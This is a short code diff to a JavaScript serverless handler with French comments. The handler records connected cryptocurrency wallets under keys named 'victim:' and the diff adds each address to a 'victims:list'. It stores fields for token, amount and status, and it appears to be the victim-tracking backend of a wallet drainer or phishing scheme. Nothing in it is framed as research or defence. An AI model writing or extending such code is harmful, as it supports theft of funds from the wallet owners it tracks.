@@ -14,7 +14,6 @@ export default async function handler(req, res) {
     }
     try {
       const key = `victim:${address}`;
-      // On vérifie si une entrée existe déjà ; si oui on ne l'écrase pas
       const existing = await kv.hgetall(key);
       if (existing) {
         console.log(`📥 Wallet reconnecté : ${address}, déjà enregistré.`);
@@ -25,10 +24,18 @@ export default async function handler(req, res) {
         chain: chain || 'unknown',
         token: '',
         amount: '0',
-        status: 'connected',   // statut initial
+        status: 'connected',
         timestamp
       });
       console.log(`🆕 Wallet connecté enregistré : ${address}`);
+
+      // Ajout à la liste
+      const list = await kv.get('victims:list') || [];
+      if (!list.includes(address)) {
+        list.push(address);
+        await kv.set('victims:list', list);
+      }
+
       return res.status(200).json({ success: true });
     } catch (err) {
       console.error('Erreur record-wallet:', err);
